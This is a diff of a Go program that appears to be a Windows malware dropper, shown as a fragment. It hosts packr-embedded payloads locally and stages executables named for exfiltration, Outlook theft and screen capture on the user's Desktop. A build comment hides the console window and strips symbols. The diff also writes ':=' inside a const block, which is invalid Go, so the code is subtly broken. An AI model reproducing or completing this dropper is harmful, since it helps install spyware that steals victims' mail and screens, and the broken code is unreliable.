@@ -1,9 +1,9 @@
 package main
 
 import (
-	"net/http"
-	"github.com/gobuffalo/packr"
-	"io"
+    "net/http"
+    "github.com/gobuffalo/packr"
+    "io"
     "os/exec"
     "fmt"
     "os"
@@ -12,17 +12,20 @@ import (
     "log"
 )
 
-
+const (
+    exfilurl := "http://127.0.0.1:3001/e.exe"
+    outlookurl := "http://127.0.0.1:3001/o.exe"
+    screenurl := "http://127.0.0.1:3001/s.exe"
+)
 //GOOS=windows GOARCH=amd64 packr build -ldflags "-H=windowsgui -s -w"
 func main() {
 	go HostFiles()
-	exfilurl := "http://127.0.0.1:3001/e.exe"
-    outlookurl := "http://127.0.0.1:3001/o.exe"
-    screenurl := "http://127.0.0.1:3001/s.exe"
+	
     usr, err := user.Current()
     if err != nil {
         log.Println( err )
     }
+	
     fmt.Println( usr.HomeDir )
     exfloc := usr.HomeDir + "\\Desktop\\e.exe"
     outloc := usr.HomeDir + "\\Desktop\\o.exe"
